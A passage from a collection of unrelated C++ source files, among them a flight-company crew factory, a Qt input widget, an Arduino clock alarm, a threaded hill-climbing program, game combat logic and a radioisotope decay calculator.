[
    "#include \"PlaneCrewFactory.h\"\n#include \"plane.h\"\n#include \"crewMember.h\"\n#include \"flightCompany.h\"\n#include <iostream>\n#include <fstream>\n#include \"FlightCompException.h\"\n\nPlaneType CPlaneCrewFactory::GetPlaneType(const CPlane* pPlane) {\n\tif (typeid(*pPlane) == typeid(CCargo))\n\t\treturn eCargo;\n\treturn eRegular;\n}\n\n\nCrewType GetCrewType(const CCrewMember* pCrew) {\n\tif (typeid(*pCrew) == typeid(CPilot))\n\t\treturn ePilot;\n\treturn eHost;\n}\nvoid CPlaneCrewFactory::GetCompanyDataFromUser(CFlightCompany& comp) {\n\tstring CompanyName;\n\tcout << \"Enter company name: \";\n\tcin >> CompanyName;\n\tif (CompanyName == \"\")\n\t\tthrow CCompStringException(\"Company name can't be empty\");\n\tcomp.SetCompanyName(CompanyName);\n\t\n\tint ok = 0;\n\tint crewMemberCount;\n\tcout << endl << \"How many crewMember would you like to add? \";\n\tcin >> crewMemberCount;\n\tdo {\n\t\ttry {\n\t\t\tif (comp.GetCrewCount() + crewMemberCount >= MAX_CREWS)\n\t\t\t\tthrow CCompLimitException(MAX_CREWS);\n\t\t\tok = 1;\n\t\t}catch (CCompLimitException& e){}\n\t} while (!ok);\n\t\n\tfor (int i = 0;i < crewMemberCount;i++) \n\t\tcomp.AddCrewMember(*GetCrewFromUser());\n\n\tok = 0;\n\tint PlaneCount;\n\tcout << endl << \"How many Planes would you like to add? \";\n\tcin >> PlaneCount;\n\tdo {\n\t\ttry {\n\t\t\tif (comp.GetNumPlanes() + PlaneCount >= MAX_PLANES)\n\t\t\t\tthrow CCompLimitException(MAX_PLANES);\n\t\t\tok = 1;\n\t\t}\n\t\tcatch (CCompLimitException& e) {}\n\t} while (!ok);\n\n\tfor (int i = 0;i < PlaneCount;i++)\n\t\tcomp.AddPlane(*GetPlaneFromUser());\n}\nCPlane* CPlaneCrewFactory::GetPlaneFromUser() {\n\tstring PlaneType;\n\tcout << \"Please enter plane type (Regular / Cargo): \";\n\tcin >> PlaneType;\n\n\tstring PlaneDegem;\n\tcout << \"Please enter plane degem: \";\n\tcin >> PlaneDegem;\n\n\tint PlaneSeats;\n\tcout << \"Please enter number of seats: \";\n\tcin >> PlaneSeats;\n\n\tif (PlaneType == PlaneType_TITLE[0]) { //Regular\n\t\treturn new CPlane(PlaneSeats, PlaneDegem);\n\t}\n\telse{\n\t\tint maxVol, maxKG, vol, kg;\n\t\tcout << \"Please enter max volume: \";\n\t\tcin >> maxVol;\n\n\t\tcout << \"Please enter max KG: \";\n\t\tcin >> maxKG;\n\n\t\tcout << \"Please enter volume: \";\n\t\tcin >> vol;\n\n\t\tcout << \"Please enter kg: \";\n\t\tcin >> kg;\n\n\t\treturn new CCargo(PlaneSeats,PlaneDegem,maxKG,maxVol,vol,kg);\n\t}\n}\nCCrewMember* CPlaneCrewFactory::GetCrewFromUser() {\n\tCAddress* address = nullptr;\n\tstring CrewMemberType;\n\tcout << \"Please enter crew member type (Host / Pilot) : \";\n\tcin >> CrewMemberType;\n\t\n\tstring name;\n\tcout << endl <<  \"Enter name: \";\n\tcin >> name;\n\n\tint minutes;\n\tcout << endl << \"Enter minutes: \";\n\tcin >> minutes;\n\n\tif (CrewMemberType == CrewType_TITLE[0]) //Host\n\t{\n\t\tint hostType;\n\t\tcout << endl << \"Enter host type (0 - eRegular,1 - eSuper,2 - eCalcelan): \";\n\t\tcin >> hostType;\n\t\treturn new CHost(name, minutes, static_cast<CHost::HostType>(hostType)); //add type\n\t}\n\telse\n\t{\n\t\tint isCaptain;\n\t\tcout << \"Is captain? \";\n\t\tcin >> isCaptain;\n\n\t\tint hasAddress;\n\t\tcout << \"Has address? \";\n\t\tcin >> hasAddress;\n\t\tif (hasAddress) {\n\t\t\tint houseNumber;\n\t\t\tstring city_str, street_str;\n\t\t\tcout << \"Enter house number: \";\n\t\t\tcin >> houseNumber;\n\t\t\t\n\t\t\tcout << \"Enter street name: \";\n\t\t\tcin >> street_str;\n\t\t\tchar* street = new char[street_str.length() + 1];\n\t\t\tfor (int i = 0;i < street_str.length();i++)\n\t\t\t\tstreet[i] = street_str[i];\n\t\t\tstreet[street_str.length()] = '\\0';\n\t\t\t\n\t\t\tcout << \"Enter city name: \";\n\t\t\tcin >> city_str;\n\t\t\tchar* city = new char[city_str.length() + 1];\n\t\t\tfor (int i = 0;i < city_str.length();i++)\n\t\t\t\tcity[i] = city_str[i];\n\t\t\tcity[city_str.length()] = '\\0';\n\t\t\taddress = new CAddress(houseNumber, street, city);\n\t\t}\n\t\treturn new CPilot(name, isCaptain, address , minutes);\n\t}\n}\n\nCCrewMember* CPlaneCrewFactory::GetCrewMemberFromFile(ifstream& inFile) {\n\treturn new CCrewMember(inFile);\n}\nCPlane* CPlaneCrewFactory::GetPlaneFromFile(ifstream& inFile) {\n\treturn new CPlane(inFile);\n}\n",
    "#include \"InputLine.h\"\n#include \"../common.h\"\n#include \"Input.h\"\n#include <qjsonvalue.h>\n#include <qlabel.h>\n#include <qwidget.h>\n\nnamespace qontrol::widgets {\n\nInputLine::InputLine(const QString &name) {\n    this->setKey(name);\n}\n\nauto InputLine::label(const QString &label) -> InputLine* {\n    m_label = new QLabel(label, this);\n    m_label->setFixedWidth(QONTROL_LABEL_WIDTH);\n    this->update();\n    return this;\n}\n\nauto InputLine::input(InputType input_type) -> InputLine* {\n    m_input = new Input(input_type);\n    m_input->setFixedWidth(QONTROL_INPUT_WIDTH);\n    this->update();\n    return this;\n}\n\nauto InputLine::validator(QValidator *validator) -> InputLine* {\n    m_input->setValidator(validator);\n    return this;\n\n}\n\nauto InputLine::inputWidth(float factor) -> InputLine* {\n    if (m_input != nullptr) {\n        auto f = (int)(factor*1000);\n        m_input->setFixedWidth(QONTROL_INPUT_WIDTH * f / 1000);\n    }\n    return this;\n}\n\nauto InputLine::unit(const QString &label) -> InputLine* {\n    m_unit = new QLabel(label, this);\n    m_unit->setFixedWidth(QONTROL_UNIT_WIDTH);\n    this->update();\n    return this;\n}\n\nvoid InputLine::update() {\n    this->clear();\n    this->pushSpacer(QONTROL_LEFT_MARGIN);\n    if (m_label != nullptr) {\n        this->push(m_label)\n            ->pushSpacer(QONTROL_H_SPACER);\n    }\n    if (m_input != nullptr) {\n        this->push(m_input)\n            ->pushSpacer(QONTROL_H_SPACER);\n    } else {\n    }\n    if (m_unit != nullptr) {\n        this->push(m_unit);\n    }\n    if (!m_no_fill) {\n        this->pushSpacer();\n    }\n}\n\nauto InputLine::hasValue() const -> bool  {\n    return m_input->hasAcceptableInput();\n}\n\nauto InputLine::isIterable() const -> bool  {\n    return false;\n}\n\nauto InputLine::input() -> Input* {\n    return this->m_input;\n}\n\nauto InputLine::value() const -> QJsonValue {\n    return m_input->value();\n}\n\nauto InputLine::setEnabled(bool enabled) -> InputLine* {\n    if (m_input != nullptr) {\n        m_input->setEnabled(enabled);\n    }\n    return this;\n}\n\nauto InputLine::setNoFill(bool enabled) -> InputLine* {\n    m_no_fill = enabled;\n    this->update();\n    return this;\n}\n\nvoid InputLine::setValue(const QString &value) {\n    if (m_input != nullptr) {\n        m_input->setText(value);\n    } else {\n        qCritical() << \"InputLine::setValue() m_input is nullptr\";\n    }\n}\n\nvoid InputLine::setValue(int value) {\n    this->setValue(QString().setNum(value));\n}\n\nvoid InputLine::setValue(double value) {\n    this->setValue(QString().setNum(value));\n}\n\nvoid InputLine::loadValue(const QJsonValue &value, int depth) {\n    if (m_input != nullptr) {\n        m_input->loadValue(value);\n    }\n}\n\n} // namespace qontrol::widgets\n",
    "class Solution {\npublic:\n    int maxScore(string s) {\n        int maxScore = 0;\n\n        // Iterate through all valid split points\n        for (int i = 1; i < s.size(); i++) {\n            int leftZeros = 0, rightOnes = 0;\n\n            // Count '0's in the left substring\n            for (int j = 0; j < i; j++) {\n                if (s[j] == '0') {\n                    leftZeros++;\n                }\n            }\n\n            // Count '1's in the right substring\n            for (int j = i; j < s.size(); j++) {\n                if (s[j] == '1') {\n                    rightOnes++;\n                }\n            }\n\n            // Calculate score and update maxScore\n            maxScore = std::max(maxScore, leftZeros + rightOnes);\n        }\n\n        return maxScore;\n    }\n};\n/*\nclass Solution {\npublic:\n    int maxScore(string s) {\n        int max=0;\n        int l=0;\n        int r=0;\n       \n        for(int i =0 ; i<s.size(); i++ )\n        {\n            if(s[i]=='0'){\n                l++;\n            \n         }\n          \n             \n            for(int j =i+1; j<s.size(); j++){\n           \n                if(s[j]=='1'){\n                    r++;   \n                }\n            }\n            \n         \n            if(max<l+r){\n            max=l+r;\n            }\n            r=0;\n        }\n            for(int i =0 ; i<s.size(); i++){\n                if(s[i]=='1'){\n                    return max;\n                }\n            }\n        return max-1;\n        \n    }\n};*/\n",
    "#include <Arduino.h>\n#include \"qpn.h\"\n#include \"ClockAlarm_SM.h\"\n#include \"lcd.h\"\n#include \"main.h\"\n\nQ_DEFINE_THIS_FILE;\n\nstatic void Timer1_setup(void);\nstatic void display_init(void);\nstatic uint8_t process_button_pad_value(uint8_t btn_pad_value);\n\n\n\nvoid setup() {\n  // put your setup code here, to run once:\n  Serial.begin(9600);\n  display_init();\n  Clock_Alarm_ctor();\n  QHSM_INIT(super_ClockAlarm);\n  Timer1_setup();\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n  static uint32_t tick_time = millis();\n   static uint32_t alarm_check_time = millis();\n  uint8_t b1,b2,btn_pad_value;\n\n\n\n\n  //1. read the button pad status\n  b1 = digitalRead(PIN_BUTTON1); \n  b2 = digitalRead(PIN_BUTTON2);\n\n  btn_pad_value = (b1<<1u)|b2;\n\n  //software button de-bouncing \n  btn_pad_value = process_button_pad_value(btn_pad_value);\n\n  while(millis() - tick_time >= 50 ){\n    //send TICK event \n    tick_time = millis();\n    Q_SIG(super_ClockAlarm) = TICK_SIG;\n    QHSM_DISPATCH(super_ClockAlarm);\n  }\n\n  while(millis() - alarm_check_time >= 500 ){\n    //send TICK event \n    alarm_check_time = millis();\n    Q_SIG(super_ClockAlarm) = ALARM_SIG;\n    QHSM_DISPATCH(super_ClockAlarm);\n  }\n\n  if(btn_pad_value){\n    if(btn_pad_value == BTN_PAD_VALUE_SET){\n      Q_SIG(super_ClockAlarm) = SET_SIG; \n    }else if(btn_pad_value == BTN_PAD_VALUE_OK){\n      Q_SIG(super_ClockAlarm) = OK_SIG;\n    }else if(btn_pad_value == BTN_PAD_VALUE_ABRT){\n      Q_SIG(super_ClockAlarm) = ABRT_SIG;\n    }else \n    Q_SIG(super_ClockAlarm) = IGNORE_SIG;\n    \n    QHSM_DISPATCH(super_ClockAlarm);\n  }\n}\n\nstatic void Timer1_setup(void){\n  TCCR1A = 0;                 //CTC mode            \n  TCCR1B = B00001100;        //prescaler=256,CTC mode\n  TIMSK1 |= B00000010;       //Interrupt enable for OCR1A compare match\n  OCR1A = 6250-1;          //OC match value for 100ms time base generation\n}\n\nstatic void display_init(void)\n{\n  lcd_begin(16,2);\n  lcd_clear();\n  lcd_move_cursor_L_to_R();\n  lcd_set_cursor(0,0);\n  lcd_no_auto_scroll();\n  lcd_cursor_off();\n}\n\nextern \"C\" void Q_onAssert(char const *module, int location) {\n    // Handle the assertion failure\n    // For example, you can blink an LED, send a message over serial, or reset the MCU.\n    \n    Serial.begin(9600);  // Initialize serial communication (if not already done)\n    Serial.print(\"Assertion failed in module: \");\n    Serial.print(module);\n    Serial.print(\", at location: \");\n    Serial.println(location);\n    \n    // Optionally, you can reset the system or put it in an infinite loop\n    while (1) {\n        // Endless loop to indicate assertion failure\n        // You could also reset the MCU using assembly code or a watchdog timer reset here.\n    }\n}\n\nstatic uint8_t process_button_pad_value(uint8_t btn_pad_value)\n{\n  static button_state_t btn_sm_state = NOT_PRESSED;\n  static uint32_t curr_time = millis();\n\n  switch(btn_sm_state){\n    case NOT_PRESSED:{\n      if(btn_pad_value){\n        btn_sm_state = BOUNCE;\n        curr_time = millis();\n      }\n      break;\n    }\n    case BOUNCE:{\n      if(millis() - curr_time >= 50 ){\n        //50ms has passed \n        if(btn_pad_value){\n          btn_sm_state = PRESSED;\n          return btn_pad_value;\n        }\n        else\n          btn_sm_state = NOT_PRESSED;\n      }\n      break;\n    }\n    case PRESSED:{\n      if(!btn_pad_value){\n        btn_sm_state = BOUNCE;\n        curr_time = millis();\n      }\n      break;\n    }\n\n  }\n\n  return 0;\n}",
    "/*\n* Chibuike Nnolim - 7644941\n* cn22hg@brocku.ca\n*/\n#include <iostream>\n#include <unistd.h>\n#include <cstdlib>\n#include <signal.h>\n#include <pthread.h>\n#include <cmath>\nusing namespace std;\n\nvolatile bool running;\nvolatile int threadsRunning;\nvolatile int globalMin = 10000000;\nint threadCount;\npthread_mutex_t lock;\n\n//f(x,y)\nint evaluate(int x, int y)\n{\n    return -1 * (y + 47) * sin(sqrt(abs(x/2 + y + 47))) - x * sin(sqrt(abs(x-y-47)));\n}\n\n//clamp value within bounds\nint clamp(int value) {\n    if (value > 512) return 512;\n    if (value < -512) return -512;\n    return value;\n}\n\n//Thread task\nvoid* climb(void* unnecessary){\n\n        srand(time(0));\n        while(running)\n        {\n                usleep(10000);\n                int newHeight = 100000;\n                bool improved = false;\n\n                int x = rand() % 512;\n                int y = rand() % 512;\n\n                int negative = rand() % 2;\n                if(negative == 1)//vary between  [-512, +512]\n                {\n                        x = x * -1;\n                        y = y * -1;\n                }\n\n                //generate 4 positions\n                for(int i = 0; i < 4; i++)\n                {\n                        int addX = rand() % 6;\n                        int addY = rand() % 6;\n                        negative = rand() % 2;\n\n                        if(negative == 1)//vary between  [-5, +5]\n                        {\n                                addX = addX * -1;\n                                addY = addY * -1;\n                        }\n                        x = x + addX;//add to current pos\n                        y = y + addY;\n\n                        x = clamp(x);\n                        y = clamp(y);\n                        int height = evaluate(x,y);\n                        if(height < newHeight)\n                        {\n                                newHeight = height;\n                                improved = true;//see if any position improved the height or not\n                        }\n                }\n\n\n                if(improved == false)newHeight = rand() % 513;\n                negative = rand() % 2;\n                if(negative == 1)newHeight = newHeight * -1;\n\n                if(newHeight < globalMin)//update global minimum\n                {\n                        pthread_mutex_lock(&lock);\n                        std::cout<<\"New best minimum found: \"<<newHeight<<\" \\n\";\n                        globalMin = newHeight;\n                        pthread_mutex_unlock(&lock);\n                }\n        }\n        //closing thread\n        pthread_mutex_lock(&lock);\n        threadsRunning--;\n        usleep(10000);\n        std::cout<<\"Thread shutting down. \\n\";\n        pthread_mutex_unlock(&lock);\n        return NULL;\n}\n\n//SIGINT\nvoid terminate(int sig)\n{\n        std::cout<<\"\\nHill climbing stopped. \\n\";\n        running = false;\n}\n\n//SIGUSR1\nvoid status(int sig)\n{\n        std::cout<<\"Current global minimum found: \"<<globalMin<<\" \\n\";\n}\n\nint main ()\n{\n\n    for(;;){\n        //Menu that loops until user decides to quit\n        std::cerr<<\"\\n\";\n        std::cerr<<\"How many hill climbers would you like to have running? Choose an integer from 0 to 8. \\n\";\n\n        int input;\n        std::cin>>input;\n\n        //Exit program\n        if(!(input > 0 && input < 9))\n        {\n                std::cout<<\"\\nNo hill climbers, exiting program. \\n\";\n                return 0;\n        }\n\n        else\n        {\n                running=true;\n                threadCount = input;\n                pthread_t threads[threadCount];//threads\n\n\n                if (signal(SIGINT,terminate)==SIG_ERR) {//terminate process\n                        std::cout<<\"Unable to change signal handler.\"<<std::endl;\n                        return 1;\n                }\n\n                if (signal(SIGUSR1,status)==SIG_ERR) {//check status of processes\n                        std::cout<<\"Unable to change signal handler.\"<<std::endl;\n                        return 1;\n                }\n\n                std::cout<<\"Hill climbers PID: \"<<getpid()<<\"\\n\";\n                for (int i = 0; i < threadCount; i++)\n                {\n                        pthread_mutex_lock(&lock);\n                        pthread_create(&threads[i], NULL, &climb, NULL);\n                        std::cout<<\"Thread #\"<<i<<\": created. \\n\";\n                        threadsRunning++;\n                        pthread_mutex_unlock(&lock);\n                }\n                while(threadsRunning > 0)\n                sleep(1);\n                std::cout<<\"Best global minimum found so far: \"<<globalMin<<\" \\n\";\n        }\n    }\n}",
    "#include \"ES.h\"\n#include\"Game.h\"\nusing namespace std;\nvoid ES::attack(Game& g)\n{\n\t\tg.setESID(getid());\n\t\t/*cout << \"---- THIS IS FOR TESTING EARTH SOLDIERS ATTACKING ALIEN SOLDIERS----\" << endl;\n\t\tcout << \"Power is: \" << getpower() << endl;\n\t\tcout << \"Health is: \" << gethealth() << endl;*/\n\t\tAlienArmy* Aliens = g.getalienarmy();\n\t\t/*cout << \"capacity is: \" << getattackcap() << endl;*/\n\t\tLinkedQueue<AS*> Templist;\n\t\tint counter = 0;\n\t\tif (getattackcap() >= Aliens->getAScount())\n\t\t{\n\t\t\tcounter = Aliens->getAScount();\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcounter = getattackcap();\n\t\t}\n\t\tfor (int i = 0; i < counter; i++)\n\t\t{\n\t\t\tAS* AlienSoldier = Aliens->removeAS();\n\t\t\tif (AlienSoldier != nullptr)\n\t\t\t{\n\t\t\t\tif (AlienSoldier->getfirstattacked() == 0)///// if not attacked before/////////\n\t\t\t\t{\n\t\t\t\t\tAlienSoldier->setfirstattacked(g.gettimestep());\n\t\t\t\t}\n\t\t\t\t/*cout << \"HEALTH BEFORE= \" << AlienSoldier->gethealth() << endl;*/\n\t\t\t\tdouble damage = ceil((getpower() * gethealth() / 100) / sqrt(AlienSoldier->gethealth()));\n\t\t\t\t/*cout << \"damage is= \" << damage << endl;*/\n\t\t\t\tif (damage >= AlienSoldier->gethealth())////////if damage more than already health (to avoid negative value of health)//////////\n\t\t\t\t{\n\t\t\t\t\tAlienSoldier->sethealth(0);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tAlienSoldier->sethealth(AlienSoldier->gethealth() - damage);\n\n\t\t\t\t}\n\t\t\t\t//cout << \"Health After =\" << AlienSoldier->gethealth() << endl;\n\t\t\t\tg.addtoattackES(AlienSoldier->getid());\n\t\t\t\tif (AlienSoldier->gethealth() == 0)\n\t\t\t\t{\n\t\t\t\t\t//cout << \"Unit is killed\" << endl;\n\t\t\t\t\tAlienSoldier->setdestructed(g.gettimestep());\n\t\t\t\t\tg.addtokilled(AlienSoldier);\n\t\t\t\t\tAliens->incrementAS_destruct();\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tTemplist.enqueue(AlienSoldier);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t/*cout << \"ES \" << getid() << \" Shot [\";\n\t\tTemplist.print();\n\t\tcout << \" ]\" << endl;*/\n\t\tAS* AlienSoldier = nullptr;\n\t\twhile (Templist.dequeue(AlienSoldier))\n\t\t{\n\t\t\tAliens->CreateAS(AlienSoldier->getid(), \"AS\", AlienSoldier->getjointime(), AlienSoldier->gethealth(), AlienSoldier->getpower(), AlienSoldier->getattackcap(), AlienSoldier->getdestructed(), AlienSoldier->getfirstattacked());\n\n\t\t}\n\n}\nint ES::getwaittime()\n{\n\treturn waittime;\n}\nint ES::getoriginalhealth()\n{\n\treturn originalhealth;\n}\nvoid ES::incrementwaittime()\n{\n\twaittime++;\n}\n//void ES::attack()\n//{\n//\n//}\nostream& operator <<(ostream& out, ES& e)\n{\n\tout << e.getid();\n\treturn out;\n}",
    "#include <assert.h>\n\n#include <iostream>\n#include <map>\n#include <memory>\n#include <queue>\n#include <set>\n#include <sstream>\n#include <string>\n#include <unordered_set>\n#include <vector>\n\nusing namespace std;\n\n#ifdef ARR_GRID\ntemplate<typename T>\nstd::ostream &operator<<(std::ostream &out, const std::vector<vector<T>> &v) {\n    out << \"[\";\n    for(size_t i = 0; i < v.size(); i++) {\n        if(i) out << \",\\n \";\n        out << v[i];\n    }\n    out << \"]\";\n    return out;\n}\n#endif\n\ntemplate<typename T>\nstd::ostream &operator<<(std::ostream &out, const std::vector<T> &v) {\n    out << \"[\";\n    for(size_t i = 0; i < v.size(); i++) {\n        if(i) out << \", \";\n        out << v[i];\n    }\n    out << \"]\";\n    return out;\n}\n\ntemplate<typename K, typename V>\nstd::ostream &operator<<(std::ostream &out, const std::map<K, V> &m) {\n    out << \"{\";\n    size_t i = 0;\n    for(auto item : m) {\n        if(i) out << \", \";\n        out << item.first << \" => \" << item.second;\n        i++;\n    }\n    out << \"}\";\n    return out;\n}\n\ntemplate<typename T>\nstd::ostream &operator<<(std::ostream &out, const std::set<T> &m) {\n    out << \"(\";\n    size_t i = 0;\n    for(auto item : m) {\n        if(i) out << \", \";\n        out << item;\n        i++;\n    }\n    out << \")\";\n    return out;\n}\n\ntemplate<typename A, typename B>\nstd::ostream &operator<<(std::ostream& out, const std::pair<A, B>& p) {\n    out << \"(\" << p.first << \", \" << p.second << \")\";\n    return out;\n}\n\ntemplate<typename T>\nstd::stringstream print(T *arr, size_t len) {\n    std::stringstream out;\n    out << \"[\";\n    for(size_t i = 0; i < len; i++) {\n        if(i) out << \", \";\n        out << arr[i];\n    }\n    out << \"]\";\n    return out;\n}\n\nstd::ostream &operator<<(std::ostream &out, const std::stringstream &str) {\n    return out << str.rdbuf();\n}\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {}\n    ListNode(int x) : val(x), next(nullptr) {}\n    ListNode(int x, ListNode *next) : val(x), next(next) {}\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {}\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n};\n",
    "#include <iostream>\n#include <fstream>\n#include <thread>\n#include <atomic>\n#include <chrono>\n\nstd::atomic<bool> loadingDone(false); // Flag to indicate loading is complete\n\nvoid loadingAnimation() {\n    const char animation[] = {'|', '/', '-', '\\\\'};\n    int index = 0;\n\n    while (!loadingDone) {\n        std::cout << \"\\rLoading data... \" << animation[index] << std::flush;\n        index = (index + 1) % 4;\n        std::this_thread::sleep_for(std::chrono::milliseconds(200)); // Animation speed\n    }\n\n    std::cout << \"\\rLoading complete!       \" << std::endl;\n}\n\nvoid readFile(const std::string& fileName) {\n    std::ifstream file(fileName);\n    if (!file) {\n        std::cerr << \"Error: Unable to open file \" << fileName << std::endl;\n        loadingDone = false; // Stop animation\n        return;\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n        // Simulate processing time for each line\n        std::this_thread::sleep_for(std::chrono::milliseconds(100));\n    }\n\n    file.close();\n    loadingDone = true; // Signal that loading is done\n}\n\nint main() {\n\n    return 0;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n#include <math.h>\n\n\n\nCalcEnviroment calEnv;\nDispenser dispEnv;\nAppEnviroment appEnv;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n\n    {\n    ui->setupUi(this);\n\n\n\n    calEnv.isotope = \"F18\";\n    calEnv.units = \"mCi\";\n    calEnv.initialAct = 0.0;\n    calEnv.decayArgument = 109.77;\n    QTime iniT = ui->timeEdit->time();\n    calEnv.initialTime = (qint64)iniT.msecsSinceStartOfDay();\n    QTime finT = ui->timeEdit->time();\n    calEnv.initialTime = (qint64)finT.msecsSinceStartOfDay();\n    ui->doubleSpinBox_2->setValue(dispEnv.volume);\n\n    this->UpdateCalcWin();\n\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::UpdateCalcWin(){\n    ui->label->setText(calEnv.units);\n    ui->label_2->setText(calEnv.units);\n    ui->label_10->setText(calEnv.units);\n\n    double timeElapsed = (double)calEnv.finalTime/60000 - (double)calEnv.initialTime/60000;\n    double argument = (timeElapsed/calEnv.decayArgument);\n    double dfactor = (double)powf64(0.5,argument);\n    calEnv.finalAct = calEnv.initialAct*dfactor;\n    QString valueAsString = QString::number(calEnv.finalAct);\n    //QString valueAsString = QString::number(timeElapsed);\n    ui->textBrowser->setText(valueAsString);\n\n    //Dispenser part\n    dispEnv.concentration = calEnv.initialAct / dispEnv.volume;\n    dispEnv.correctedConcentration = calEnv.finalAct / dispEnv.volume;\n    QString concentrationAsString = QString::number(dispEnv.concentration);\n    QString corrconcentrationAsString = QString::number(dispEnv.correctedConcentration);\n    ui->label_concen->setText(concentrationAsString+\" \"+calEnv.units+\"/mL\");\n    ui->label_corrcon->setText(corrconcentrationAsString+\" \"+calEnv.units+\"/mL\");\n\n    dispEnv.actRequested = ui->doubleSpinBox_3->value();\n    double tempVol = dispEnv.actRequested / dispEnv.correctedConcentration;\n    dispEnv.volToDipense = tempVol;\n\n    ui->doubleSpinBox_3->setValue(dispEnv.actRequested);\n    ui->doubleSpinBox_4->setValue(dispEnv.volToDipense);\n\n}\n\nvoid MainWindow::on_comboBox_currentIndexChanged(const QString &arg1)\n{\n    calEnv.isotope = ui->comboBox->currentText();\n    if(calEnv.isotope == \"F18\"){\n        calEnv.decayArgument = 109.77;\n    }else if(calEnv.isotope == \"Tc99m\"){\n        calEnv.decayArgument = 360.59999999999997;\n    }else if(calEnv.isotope == \"C11\"){\n        calEnv.decayArgument = 20.39;\n    }else if(calEnv.isotope == \"Cu64\"){\n        calEnv.decayArgument = 762.0;\n    }\n\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_comboBox_2_currentIndexChanged(const QString &arg1)\n{\n    calEnv.units = ui->comboBox_2->currentText();\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_doubleSpinBox_valueChanged(double arg1)\n{\n    calEnv.initialAct = ui->doubleSpinBox->value();\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_timeEdit_userTimeChanged(const QTime &time)\n{\n    QTime iniT = ui->timeEdit->time();\n    calEnv.initialTime = (qint64)iniT.msecsSinceStartOfDay();\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_timeEdit_2_userTimeChanged(const QTime &time)\n{\n    QTime finT = ui->timeEdit_2->time();\n    calEnv.finalTime = (qint64)finT.msecsSinceStartOfDay();\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_doubleSpinBox_2_valueChanged(double arg1)\n{\n    dispEnv.volume = ui->doubleSpinBox_2->value();\n    UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_doubleSpinBox_3_valueChanged(double arg1)\n{\n    dispEnv.actRequested = ui->doubleSpinBox_3->value();\n    double tempVol = dispEnv.actRequested / dispEnv.correctedConcentration;\n    dispEnv.volToDipense = tempVol;\n    ui->doubleSpinBox_4->setValue(tempVol);\n    //UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_doubleSpinBox_4_textChanged(const QString &arg1)\n{\n    //\n}\n\n\nvoid MainWindow::on_doubleSpinBox_4_valueChanged(double arg1)\n{\n    dispEnv.volToDipense = ui->doubleSpinBox_4->value();\n    double tempAct = dispEnv.volToDipense * dispEnv.correctedConcentration;\n    dispEnv.actRequested = tempAct;\n    ui->doubleSpinBox_3->setValue(tempAct);\n    //UpdateCalcWin();\n}\n\n\nvoid MainWindow::on_pushButton_clicked()\n{\n\n    appEnv.rows++;\n    QTime t_init = QTime::fromMSecsSinceStartOfDay(calEnv.initialTime);\n    QTime t_final = QTime::fromMSecsSinceStartOfDay(calEnv.finalTime);\n    QString itemAdd = calEnv.isotope + \" C: \" + QString::number(dispEnv.concentration) + \" \" + calEnv.units + \"/mL At: \" + t_init.toString() +\n            \"\\tC: \" + QString::number(dispEnv.correctedConcentration) + \" \" + calEnv.units + \"/mL At: \" + t_final.toString() +\n            \"\\tAct: \" + QString::number(dispEnv.actRequested) + \" \" + calEnv.units +\n            \"\\tVol: \" + QString::number(dispEnv.volToDipense) + \"mL\";\n    ui->listWidget->addItem(itemAdd);\n}\n\n\nvoid MainWindow::on_pushButton_4_clicked()\n{\n    QTime t_init = QTime::fromMSecsSinceStartOfDay(calEnv.initialTime);\n    QTime t_final = QTime::fromMSecsSinceStartOfDay(calEnv.finalTime);\n    QString itemAdd = calEnv.isotope + \" A: \" + QString::number(calEnv.initialAct) + \" \" + calEnv.units +",
    "#include \"TriangleLoader.hpp\"\n#include \"Logger.hpp\"\n\n#define TINYOBJLOADER_IMPLEMENTATION\n#include <tiny_obj_loader.h>\n\nnamespace boza\n{\n    MeshData TriangleLoader::load_from_obj(const std::string& filename)\n    {\n        tinyobj::attrib_t                attrib;\n        std::vector<tinyobj::shape_t>    shapes;\n        std::vector<tinyobj::material_t> materials;\n        std::string                      warn, err;\n\n        if (!LoadObj(&attrib, &shapes, &materials, &warn, &err, filename.c_str()))\n        {\n            Logger::error(\"Failed to load OBJ file: {}\", err);\n            return {};\n        }\n\n        if (!warn.empty()) Logger::warn(warn);\n\n        MeshData out_mesh_data;\n\n        out_mesh_data.vertices.reserve(attrib.vertices.size() / 3);\n\n        for (size_t i = 0; i < attrib.vertices.size(); i += 3)\n        {\n            out_mesh_data.vertices.emplace_back(\n                attrib.vertices[i],\n                attrib.vertices[i + 1],\n                attrib.vertices[i + 2]\n            );\n        }\n\n        for (const auto& shape : shapes)\n        {\n            for (const auto& index : shape.mesh.indices)\n                out_mesh_data.indices.push_back(static_cast<uint32_t>(index.vertex_index));\n        }\n\n        return out_mesh_data;\n    }\n}\n",
